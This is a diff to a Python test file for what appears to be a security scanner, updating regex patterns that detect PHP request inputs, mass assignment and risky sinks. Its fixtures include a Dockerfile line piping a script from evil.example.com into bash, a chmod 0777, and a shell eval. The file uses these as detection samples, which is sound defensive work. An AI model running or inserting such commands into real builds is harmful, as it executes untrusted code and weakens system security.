@@ -382,7 +382,8 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("source", "go", r"\bos\.(?:Args|Getenv)\b", "source", GO_SOURCES_SRC, "main.go", "a := os.Args[1]", "process_input"),
     ("source", "ruby", r"\b(?:params\s*\[|request\.)", "source", RUBY_SOURCES_SRC, "app.rb", "id = params[:id]", "http_request_input"),
     ("source", "ruby", r"\b(?:ENV\s*\[|ARGV\b)", "source", RUBY_SOURCES_SRC, "app.rb", "e = ENV['HOME']", "process_input"),
-    ("source", "php", r"(?-i:\$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER(?!\s*\[\s*['\"]arg[vc]['\"]))\b)", "source", PHP_SOURCES_SRC, "index.php", "$id = $_GET['id'];", "http_request_input"),
+    ("source", "php", r"(?-i:\$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER(?!\s*\[\s*['\"]arg[vc]['\"]))\b"
+     r"|\$HTTP_(?:(?:GET|POST|COOKIE|SERVER)_VARS|POST_FILES|RAW_POST_DATA)\b)", "source", PHP_SOURCES_SRC, "index.php", "$id = $_GET['id'];", "http_request_input"),
     ("source", "php", r"(?:\$request|\$req|\$this->(?:request|input)|\brequest\s*\(\s*\))\s*->", "source", PHP_SOURCES_SRC, "index.php", "$page = $request->input('page');", "http_request_input"),
     ("source", "php", r"\b(?:Input|Request)::(?:input|get|all|query|post|json|file|header|cookie)\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$legacy = Input::get('legacy');", "http_request_input"),
     ("source", "php", r"php://input|\bfilter_input(?:_array)?\s*\(\s*INPUT_(?:GET|POST|COOKIE|SERVER|REQUEST)\b|\b(?:getallheaders|apache_request_headers)\s*\(", "source",
@@ -394,7 +395,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
      "$id = required_param('id', PARAM_INT);", "http_request_input"),
     ("source", "php", treesitter_catalogues._PHP_SERVER_ARGV, "source",
      "<?php\n$opts = $_SERVER['argv'];\n", "bin/sync.php", "$opts = $_SERVER['argv'];", "http_request_input"),
-    ("source", "php", r"\bgetenv\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$e = getenv('HOME');", "process_input"),
+    ("source", "php", r"\bgetenv\s*\(|(?-i:\$_ENV\b)", "source", PHP_SOURCES_SRC, "index.php", "$e = getenv('HOME');", "process_input"),
     ("source", "php", "|".join(pattern for _evidence, pattern in treesitter_catalogues._PHP_CLI_INPUT_PATTERNS), "source", PHP_SOURCES_SRC, "index.php", "$job = $argv[1];", "process_input"),
     ("source", "blade", r"\{\{(?!--)[^}\r\n]+\}\}|\{!![^!\r\n]+!!\}", "source", BLADE_SOURCES_SRC, "profile.blade.php", "{{ $user->name }}", "template_input"),
     ("source", "c", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", C_SOURCES_SRC, "main.c", 'char *a = argv[1];', "process_input"),
@@ -442,8 +443,10 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("import", "twig", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", TWIG_IMPORT_SRC, "x.html.twig", '<script src="app.js">', None),
     # ========================== extra sinks =================================
     ("extra_sink", "php", treesitter_streaming._PHP_STREAM_INCLUDE, "extra_sink", PHP_IMPORT_SRC, "x.php", "require 'c.php';", "file_inclusion"),
-    ("extra_sink", "php", treesitter_catalogues._PHP_STREAM_EXTRACT, "extra_sink",
+    ("extra_sink", "php", treesitter_catalogues._PHP_STREAM_MASS_ASSIGNMENT, "extra_sink",
      "<?php\nextract($_POST);\n", "x.php", "extract($_POST);", "mass_assignment"),
+    ("extra_sink", "php", treesitter_catalogues._PHP_STREAM_VARIABLE_VARIABLE, "extra_sink",
+     "<?php\n$$key = $value;\n", "x.php", "$$key = $value;", "mass_assignment"),
     ("extra_sink", "dockerfile", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN curl https://evil.example.com/x.sh | bash", "remote_pipe_to_shell"),
     ("extra_sink", "dockerfile", r"\bchmod\s+(?:-R\s+)?[0-7]*777\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN chmod -R 0777 /app", "permissive_chmod"),
     ("extra_sink", "shell", r"\beval\b", "extra_sink", SHELL_SINK_SRC, "x.sh", 'eval "$cmd"', "shell_eval"),
@@ -760,9 +763,9 @@ def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
         | _real_extra_sink_keys()
         | _real_extra_entry_keys()
     )
-    assert len(real_keys) == 112, (
-        f"expected 112 streaming catalogue entries (43 sources + 25 imports + "
-        f"31 extra sinks + 13 extra entry points), found {len(real_keys)}. The catalogue "
+    assert len(real_keys) == 113, (
+        f"expected 113 streaming catalogue entries (43 sources + 25 imports + "
+        f"32 extra sinks + 13 extra entry points), found {len(real_keys)}. The catalogue "
         f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
     )
 
